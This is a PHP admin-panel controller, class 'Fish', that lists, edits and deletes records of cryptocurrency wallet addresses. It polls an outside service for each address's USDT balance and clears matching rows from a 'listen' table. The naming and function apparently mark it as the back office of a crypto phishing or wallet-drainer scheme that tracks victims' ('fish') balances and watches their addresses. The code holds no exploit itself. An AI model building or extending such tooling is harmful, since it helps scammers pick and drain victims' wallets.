<?php

namespace app\admin\controller;

use app\common\controller\Backend;
use think\Db;
use think\exception\PDOException;
use think\exception\ValidateException;

class Fish extends Backend {
    
    protected $searchFields = 'order_no';

    /**
     * Order模型对象
     * @var \app\admin\model\Order
     */
    protected $model = null;

    public function _initialize() {
        parent::_initialize();
        $this->model = new \app\admin\model\Fish;

    }

    public function import() {
        parent::import();
    }
    
    
     public function index() {
        //设置过滤方法
        $this->request->filter(['strip_tags', 'trim']);
        if ($this->request->isAjax()) {
            //如果发送的来源是Selectpage，则转发到Selectpage
            if ($this->request->request('keyField')) {
                return $this->selectpage();
            }

            $status = $this->request->param('status');
            $where_status = [];
            if(!empty($status) && $status != 'all'){
                $where_status['order.status'] = $status;
            }


            list($where, $sort, $order, $offset, $limit) = $this->buildparams();
            
            // var_dump($where,$sort,$order,$offset,$limit);die;

            $list = $this->model->order($sort, $order)->paginate($limit);

            $result = ["total" => $list->total(), "rows" => $list->items()];

            return json($result);
        }
        return $this->view->fetch();
    }
    
    public function edit($ids = null) {
        $row = $this->model->get($ids);
        if (!$row) {
            $this->error(__('No Results were found'));
        }
        $adminIds = $this->getDataLimitAdminIds();
        if (is_array($adminIds)) {
            if (!in_array($row[$this->dataLimitField], $adminIds)) {
                $this->error(__('You have no permission'));
            }
        }
        if ($this->request->isPost()) {
            $params = $this->request->post("row/a");
            if ($params) {
                $params = $this->preExcludeFields($params);
                $result = false;
                Db::startTrans();
                try {
                    //是否采用模型验证
                    if ($this->modelValidate) {
                        $name = str_replace("\\model\\", "\\validate\\", get_class($this->model));
                        $validate = is_bool($this->modelValidate) ? ($this->modelSceneValidate ? $name . '.edit' : $name) : $this->modelValidate;
                        $row->validateFailException(true)->validate($validate);
                    }
                    $result = $row->allowField(true)->save($params);
                    Db::commit();
                } catch (ValidateException $e) {
                    Db::rollback();
                    $this->error($e->getMessage());
                } catch (PDOException $e) {
                    Db::rollback();
                    $this->error($e->getMessage());
                } catch (Exception $e) {
                    Db::rollback();
                    $this->error($e->getMessage());
                }
                if ($result !== false) {
                    $this->success();
                } else {
                    $this->error(__('No rows were updated'));
                }
            }
            $this->error(__('Parameter %s can not be empty', ''));
        }

        $this->view->assign("row", $row);
        return $this->view->fetch();
    }
    
    public function update($ids = null){
        
        $row = $this->model->all();
        $fail = 0;
        $success = 0;
        $timestamp = time();
        
        foreach ($row as $key => $val){
            $data = $val->toArray();
            $url = "https://check.coinservapi.com/checkBalance?address={$data['address']}&type={$data['type']}&bi=USDT";
            $result = hmCurl($url);
            $result = json_decode($result,true);
            
            if($result['code'] == 1){
                $balance = $result['balance'];
                $this->model->update(['balance' => $balance,'update_time' => $timestamp],['id' => $data['id']]);
                $success += 1;
            }else{
                $fail += 1;
            }
            
            
            
                
        }
        
        $this->success("成功{$success}条，失败{$fail}条",'',1);  
    }
    
    public function del($ids = null){
       
       $fish =  Db::name("fish");
       $address = $fish->where('id',$ids)->column('address')[0];
       
       $fish->delete($ids);
       Db::name('listen')->where('address',$address)->delete();
       
       $this->success("删除成功",'',1);   
       
       
    }
        
        
    

}    